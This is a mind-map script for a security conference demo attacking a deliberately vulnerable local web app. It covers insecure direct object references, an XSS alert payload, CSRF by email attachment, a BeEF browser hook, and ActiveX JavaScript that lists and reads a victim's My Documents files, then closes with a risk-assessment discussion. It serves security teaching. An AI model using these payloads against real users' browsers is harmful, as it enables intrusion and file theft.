<map version="freeplane 1.2.0">
<!--To view this file, download free mind mapping software Freeplane from http://freeplane.sourceforge.net -->
<node TEXT="derbycon Carrierdemo Walkthru" FOLDED="false" ID="ID_1723255651" CREATED="1283093380553" MODIFIED="1378749540875"><hook NAME="MapStyle" background="#d9e4b1" zoom="0.75" layout="OUTLINE">
    <properties show_icon_for_attributes="true" show_note_icons="true"/>

<map_styles>
<stylenode LOCALIZED_TEXT="styles.root_node">
<stylenode LOCALIZED_TEXT="styles.predefined" POSITION="right">
<stylenode LOCALIZED_TEXT="default" MAX_WIDTH="400" COLOR="#000000" STYLE="bubble">
<font NAME="SansSerif" SIZE="12" BOLD="false" ITALIC="false"/>
</stylenode>
<stylenode LOCALIZED_TEXT="defaultstyle.details"/>
<stylenode LOCALIZED_TEXT="defaultstyle.note"/>
<stylenode LOCALIZED_TEXT="defaultstyle.floating">
<edge STYLE="hide_edge"/>
<cloud COLOR="#f0f0f0" SHAPE="ROUND_RECT"/>
</stylenode>
</stylenode>
<stylenode LOCALIZED_TEXT="styles.user-defined" POSITION="right">
<stylenode LOCALIZED_TEXT="styles.topic" COLOR="#18898b" STYLE="fork">
<font NAME="Liberation Sans" SIZE="12" BOLD="true"/>
</stylenode>
<stylenode LOCALIZED_TEXT="styles.subtopic" COLOR="#cc3300" STYLE="fork">
<font NAME="Liberation Sans" SIZE="12" BOLD="true"/>
</stylenode>
<stylenode LOCALIZED_TEXT="styles.subsubtopic" COLOR="#669900">
<font NAME="Liberation Sans" SIZE="12" BOLD="true"/>
</stylenode>
<stylenode LOCALIZED_TEXT="styles.important">
<icon BUILTIN="yes"/>
</stylenode>
</stylenode>
<stylenode LOCALIZED_TEXT="styles.AutomaticLayout" POSITION="right">
<stylenode LOCALIZED_TEXT="AutomaticLayout.level.root" COLOR="#000000">
<font SIZE="20"/>
</stylenode>
<stylenode LOCALIZED_TEXT="AutomaticLayout.level,1" COLOR="#0033ff">
<font SIZE="18"/>
</stylenode>
<stylenode LOCALIZED_TEXT="AutomaticLayout.level,2" COLOR="#00b439">
<font SIZE="16"/>
</stylenode>
<stylenode LOCALIZED_TEXT="AutomaticLayout.level,3" COLOR="#990000">
<font SIZE="14"/>
</stylenode>
<stylenode LOCALIZED_TEXT="AutomaticLayout.level,4" COLOR="#111111">
<font SIZE="12"/>
</stylenode>
</stylenode>
</stylenode>
</map_styles>
</hook>
<attribute_layout VALUE_WIDTH="100"/>
<node TEXT="Before starting demo:" POSITION="left" ID="ID_1498668697" CREATED="1341320592816" MODIFIED="1341333278608">
<attribute_layout VALUE_WIDTH="100"/>
<node TEXT="Set screen colors?&#xa;for IE, in tools...options...general...colors...use windows" ID="ID_447242506" CREATED="1378821597921" MODIFIED="1378843209812">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node ID="ID_1007059173" CREATED="1378747128243" MODIFIED="1378749002869"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      logon as admin
    </p>
    <ol>
      <li>
        start sqlexpress
      </li>
      <li>
        run the host-only network fix from the desktop
      </li>
    </ol>
  </body>
</html>
</richcontent>
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="logoff admin, and login regular" ID="ID_460724942" CREATED="1378749448878" MODIFIED="1378749466572">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="Check that the Kali VM is set for host only networking." ID="ID_1354108989" CREATED="1341333278647" MODIFIED="1378749409796">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="Enable the VM to talk to the host:  In the VirtualBox Manager:&#xa;  File..Preferences..Network..Edit Host Only Network&#xa;Ensure the first three parts of the &quot;adapter IP addr&quot; match those of the DHCP server" ID="ID_918990905" CREATED="1341333278627" MODIFIED="1341926724046">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="Start up Kali VM &amp; login as root" ID="ID_823904121" CREATED="1341333278622" MODIFIED="1378746338748">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="Start iisexpress" ID="ID_1530809850" CREATED="1360169918772" MODIFIED="1378749575335">
<attribute_layout VALUE_WIDTH="100"/>
<richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      c:\Program Files\IISExpress\iisexpress /site:carrierdemo
    </p>
  </body>
</html>
</richcontent>
</node>
<node TEXT="Start IE on host machine." ID="ID_653924364" CREATED="1341333278617" MODIFIED="1378826153359">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="Ensure IE is set as default browser:  Tools..Options..Advanced...General tab..Make Default." ID="ID_684602962" CREATED="1341333278613" MODIFIED="1378826153371">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="Check that &quot;Carrier&quot; and &quot;Carrier Mail&quot; are favorites." ID="ID_676883559" CREATED="1341333278610" MODIFIED="1378819467525">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="Logon to carrier demo to be sure it is working (susan/susan)" ID="ID_99644838" CREATED="1360511426818" MODIFIED="1378749644538">
<attribute_layout VALUE_WIDTH="100"/>
<node TEXT="If you get &quot;no process on other end of pipe&quot;, just try again." ID="ID_1400836554" CREATED="1378819557602" MODIFIED="1378819574295">
<attribute_layout VALUE_WIDTH="100"/>
</node>
</node>
</node>
<node TEXT="Ensure copy code is available" POSITION="left" ID="ID_1451953425" CREATED="1341333361653" MODIFIED="1341333371948">
<attribute_layout VALUE_WIDTH="100"/>
<node TEXT="&lt;SCRIPT&gt;alert(99);&lt;/SCRIPT&gt;" ID="ID_1228474385" CREATED="1341334189998" MODIFIED="1378820022226">
<attribute_layout VALUE_WIDTH="100"/>
</node>
</node>
<node TEXT="Start powerpoint" POSITION="left" ID="ID_1247479868" CREATED="1379433085435" MODIFIED="1379433133869" LINK="The.High.Risk.Of.Low.Risk.Applications.pptx">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="End powerpoint" POSITION="left" ID="ID_490420921" CREATED="1379433233448" MODIFIED="1379433237927">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="Looking around the application" POSITION="right" ID="ID_1546361036" CREATED="1341335557832" MODIFIED="1341335582332">
<attribute_layout VALUE_WIDTH="100"/>
<node TEXT="Although the application and exploits are real, all persons and their actions protrayed in this demo are fictitous.  Any resemblance to real persons, living or dead, is purely coincidental." ID="ID_1257146868" CREATED="1342614149964" MODIFIED="1342614563672"/>
<node TEXT="Go to http://localhost:61289/Default.aspx" ID="ID_254087725" CREATED="1341243350011" MODIFIED="1378930172453" LINK="http://localhost:61289/Default.aspx"><richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Susan Queue&#160;&#160;is developing an evil plan to get information off of Jennifer's&#160;&#160;workstation.
    </p>
  </body>
</html>
</richcontent>
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="Logon as Susan Queue (userid susan)" ID="ID_1585615768" CREATED="1341256062586" MODIFIED="1378930248288">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="Go to main menu, and then Edit Contact&#xa;Profile" ID="ID_1085489063" CREATED="1341256514471" MODIFIED="1379433343316"><richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      By inspecting the source view of this page (page...view source), she sees that a &quot;contact id&quot; of 20 (line 62) is sent to the server when she updates her record.&#160;&#160;She suspects that this is the key that she needs to get to Jennifer's data.&#160;&#160;But what is Jennifer's &quot;contact id&quot;?
    </p>
  </body>
</html>

</richcontent>
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="Go to the main menu, and then View Contact Profile" ID="ID_1843098643" CREATED="1341256947694" MODIFIED="1360514274184"><richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      When Susan goes to her ViewContact Profile page, she can see a &quot;contact&quot; number in the URL.
    </p>
  </body>
</html>
</richcontent>
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="Change the contact number in the browser&apos;s address bar from 20 to 46&#xa;and submit.&#xa;You should see Jennifer Jackson&apos;s record." ID="ID_1828050582" CREATED="1341257157161" MODIFIED="1341335500523"><richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      A little trial and error, and Susan discovers Jennifer's contact number is 46.
    </p>
  </body>
</html>
</richcontent>
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="View the source of the page, and note the carrier number is 48 (line 59)." ID="ID_118567282" CREATED="1341257286043" MODIFIED="1378750678390"><richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      By inspecting the source, Susan discovers that Jennifer's also has a &quot;carrier id&quot; of 48.
    </p>
  </body>
</html>
</richcontent>
<attribute_layout VALUE_WIDTH="100"/>
</node>
</node>
<node TEXT="Cross Site Scripting" POSITION="right" ID="ID_1264345734" CREATED="1341335663763" MODIFIED="1341335671193">
<attribute_layout VALUE_WIDTH="100"/>
<node TEXT="Return to Edit Contact Profile" ID="ID_1601779152" CREATED="1341257402234" MODIFIED="1360172801558"><richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Susan is now going to check if there is an XSS flaw in the application.
    </p>
    <p>
      She finds one in the address field.
    </p>
  </body>
</html>
</richcontent>
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="Enter&#xa;&lt;SCRIPT&gt;alert(99);&lt;/SCRIPT&gt;&#xa;in the addr2 field and update&#xa;You should get the alert dialog&#xa;Reset addr2 to back&#xa;log off carrierdemo" ID="ID_1383410608" CREATED="1341258506675" MODIFIED="1378930641331"><richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Now Susan wants to get Jennifer to execute her evil script.&#160;&#160;Susan's loginid doesn't have the authority to update those kinds of records.&#160;&#160;She could send her a malicious email attachment, but she knows that Jennifer is a educated and conscientious computer user, and is unlikely to click on email attachments.&#160;&#160;In fact, she would probably report it and get Susan in trouble.
    </p>
    <p>
      
    </p>
    <p>
      However, Susan knows that Donna can update those carrier records, and that Donna is not so conscientious.&#160;&#160;She has seen Donna is still playing Farmville on her work computer .&#160;&#160;So she figures she can get her to click on an email attachment.&#160;&#160;But she is not interested in Donna's workstation.&#160;&#160;What to do?
    </p>
  </body>
</html>
</richcontent>
<attribute_layout VALUE_WIDTH="100"/>
</node>
</node>
<node TEXT="User data are stored in this xml file." LOCALIZED_STYLE_REF="defaultstyle.floating" POSITION="right" ID="ID_758912706" CREATED="1378816958171" MODIFIED="1378817041693" HGAP="-232" VSHIFT="-460" LINK="file:/C:/visual%20studio%202010/Projects/CarrierDemo/CarrierDemo/App_Data/users.xml">
<hook NAME="FreeNode"/>
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="Cross Site Request Forgery" POSITION="right" ID="ID_739441063" CREATED="1341335692623" MODIFIED="1341335701633">
<attribute_layout VALUE_WIDTH="100"/>
<node TEXT="Login to Carrierdemo as Donna&#xa;Open another IE window&#xa;Go to demo mail&#xa;Click on the attachment.  You&apos;ll get a warning, but everybody just clicks OK." ID="ID_13363778" CREATED="1341319428419" MODIFIED="1378826153375"><richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      We won't go into the details of creating CSRF scripts here, but let's just say that Susan uses a point-and-hack tool to create a CSRF attack, attaches it to an email and sends it to Donna.&#160;&#160;When Donna clicks on it, it will generate a transaction that will update Jennifer's record in the database with the malicious script.&#160;&#160;Donna has done her part as an unwitting accomplice; we won't need her any more.&#160;&#160;Once this is done, Susan fires up BeEF, another point-and-hack tool.
    </p>
  </body>
</html>
</richcontent>
<attribute_layout VALUE_WIDTH="100"/>
</node>
</node>
<node TEXT="BeEF Hook" POSITION="right" ID="ID_1568402155" CREATED="1341335732443" MODIFIED="1341335759183">
<attribute_layout VALUE_WIDTH="100"/>
<node TEXT="Close the demo email browser.&#xa;Log Donna out of Carrier.&#xa;Switch to Kali VM.&#xa;Start BeEF from terminal&#xa;cd /usr/share/beef-xss&#xa;./beef&#xa;Ensure Beef is running on 192.168.56.101:3000&#xa;Start Iceweasel, and go to BeEF console." ID="ID_648137359" CREATED="1341320275848" MODIFIED="1378825663968"><richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      I have the BeEF running in a virtual machine on my workstation.&#160;&#160;In real life, this would be running on Susan's workstation, but I only have one computer here today.
    </p>
    <p>
      Now Susan waits for Jennifer to login and call up her record.
    </p>
  </body>
</html>
</richcontent>
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="Return to host.&#xa;Go to Carrier Login IE&#xa;Login as Jennifer&#xa;Go to Main Menu&#xa;The machine should show up as hooked" ID="ID_1128161167" CREATED="1341320275848" MODIFIED="1378826371268"><richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Once hooked, we can extract information from Jennifer's computer.
    </p>
  </body>
</html>
</richcontent>
<attribute_layout VALUE_WIDTH="100"/>
</node>
</node>
<node TEXT="Exploit the workstation" POSITION="right" ID="ID_973669655" CREATED="1341335769923" MODIFIED="1341335775213">
<attribute_layout VALUE_WIDTH="100"/>
<node TEXT="Execute Browser..Detect Unsafe ActiveX - this is IE only." ID="ID_1257355619" CREATED="1341325037573" MODIFIED="1360617676643"><richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      The browser says that it is configured for unsafe ActiveX.&#160;&#160;You might be surprised how many businesses have to do this to keep their old apps from crashing.&#160;&#160;Now, you probably haven't written COM stuff for ten years, but here it comes in handy for Susan.&#160;&#160;We can inspect the registry of Jennifer's computer next.
    </p>
  </body>
</html>
</richcontent>
</node>
<node ID="ID_122764577" CREATED="1341325150349" MODIFIED="1360693849079"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Execute Host...Get Registry Keys
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      this works because we have unsafe activex allowed.
    </p>
  </body>
</html>
</richcontent>
</node>
<node ID="ID_467470787" CREATED="1360617445788" MODIFIED="1378931366535"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Social Engineering...Pretty Theft
    </p>
    <p>
      <strike>Social Engineering...Clippy </strike><i>not w/o network connection</i>
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Susan could play games with Jennifer's and get her to download stuff.
    </p>
  </body>
</html>
</richcontent>
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="Browser..Hooked domain..replace content" ID="ID_955432295" CREATED="1360694332847" MODIFIED="1360694375284"><richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      She could send Jennifer an ugly message.&#160;&#160;But that's not what she's after today.
    </p>
  </body>
</html>
</richcontent>
</node>
<node TEXT="Execute Browser..Hooked Domain...Get Page HTML" ID="ID_3638344" CREATED="1341326868302" MODIFIED="1379434052394"><richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Or we could get a copy of the page Jennifer is looking at.&#160;&#160;We could then modify it, and use Browser..hooked domain..Replace HREFs to get her to go to it and possibly do nasty things to her computer.&#160;&#160;But that's for another day.
    </p>
    <p>
      
    </p>
    <p>
      Paul has discovered that we can map a network share to Jennifer's windows session.&#160;&#160;That suggests some interesting avenues of exploration, too.&#160;&#160;Still another day.
    </p>
  </body>
</html>

</richcontent>
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="Execute Misc...Raw JavaScript" LOCALIZED_STYLE_REF="default" ID="ID_1746273980" CREATED="1341927541961" MODIFIED="1378925439137"><richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Today we're going to send JavaScript straight to Jennifer's browser and execute it there.&#160;&#160;First we send over some code to list the contents of her My Documents folder.
    </p>
  </body>
</html>
</richcontent>
<attribute_layout VALUE_WIDTH="100"/>
<node TEXT="var objShell = new ActiveXObject(&quot;shell.application&quot;);&#xa;var objFolder;&#xa;var ssf = 5;&#xa;objFolder = objShell.NameSpace(ssf);&#xa;objFolderItems = objFolder.Items();&#xa;var fils = objFolderItems.Count;&#xa;var s = &quot;&quot;;&#xa;for (var i=0; i&lt;fils; i++)&#xa;{&#xa;    s += objFolderItems.Item(i)&#xa;    s += &quot; -- &quot;;&#xa;}&#xa; return(s);" ID="ID_1538900242" CREATED="1378840289328" MODIFIED="1378840330902">
<attribute_layout VALUE_WIDTH="100"/>
</node>
</node>
<node TEXT="Open desktop\mydocuments.js with notepad&#xa;Copy the contents to the text box in Beef&#xa;Execute the command and wait a minute." LOCALIZED_STYLE_REF="default" ID="ID_348374975" CREATED="1341927695107" MODIFIED="1378925446708"><richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Voila!&#160;&#160;All the files in Jennifer's My Documents folder.&#160;&#160;Let's pick one and open it.
    </p>
  </body>
</html>
</richcontent>
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="Open desktop\readfile.beef.js with notepad&#xa;Copy the contents to Misc...Raw JavaScript text box&#xa;Execute and wait a minute." LOCALIZED_STYLE_REF="default" ID="ID_1504271570" CREATED="1341927803970" MODIFIED="1378925446733"><richcontent TYPE="DETAILS">

<html>
  <head>
    
  </head>
  <body>
    <p>
      WORKS WITH IE, NOT FF And we read the contents of one of Jennifer's files.
    </p>
  </body>
</html>
</richcontent>
<attribute_layout VALUE_WIDTH="100"/>
<node TEXT="var objShell = new ActiveXObject(&quot;shell.application&quot;);&#xa;var objFolder;&#xa;var ssf = 5;&#xa;     &#xa;objFolder = objShell.NameSpace(ssf);&#xa;objFolderItems = objFolder.Items();&#xa;var fils = objFolderItems.Count;&#xa;for (var i=0; i&lt;fils; i++)&#xa;{&#xa;if (objFolderItems.Item(i).Name == &quot;sensitive.txt&quot;)&#xa;{&#xa;var flditm = objFolderItems.Item(i);&#xa;     var fldItmPath = flditm.Path;&#xa;}&#xa;}&#xa;var fso = new ActiveXObject(&quot;Scripting.FileSystemObject&quot;);&#xa;var file = fso.GetFile(fldItmPath);&#xa;var ts = file.OpenAsTextStream(1,-2);&#xa;var s = ts.ReadAll();&#xa;return(s);" ID="ID_1847996836" CREATED="1378925417469" MODIFIED="1378925425333">
<attribute_layout VALUE_WIDTH="100"/>
</node>
</node>
</node>
<node TEXT="Risk Mgmt" POSITION="right" ID="ID_422368902" CREATED="1360169622463" MODIFIED="1360169630357">
<attribute_layout VALUE_WIDTH="100"/>
<node TEXT="That was the easy part, the parlor tricks." ID="ID_1612630535" CREATED="1360172271411" MODIFIED="1378925518608">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="What does this sort of thing mean for your risk assessment procedures?" ID="ID_1523505637" CREATED="1360169632346" MODIFIED="1360169662719">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="This application was initially considered low risk - it dealt with public data, availability was not a big concern, and if the data were lost or corrupted, the effect would be minimal.  So it was low on the CIA scale." ID="ID_347056513" CREATED="1360169663195" MODIFIED="1360169755018">
<attribute_layout VALUE_WIDTH="100"/>
</node>
<node TEXT="But if Jennifer had information on her workstation that was high in CIA, this app is a threat to it.  How do we detect and analyze and mitigate this risk? (discussion)" ID="ID_1467304372" CREATED="1360169755416" MODIFIED="1360169895676">
<attribute_layout VALUE_WIDTH="100"/>
</node>
</node>
</node>
</map>
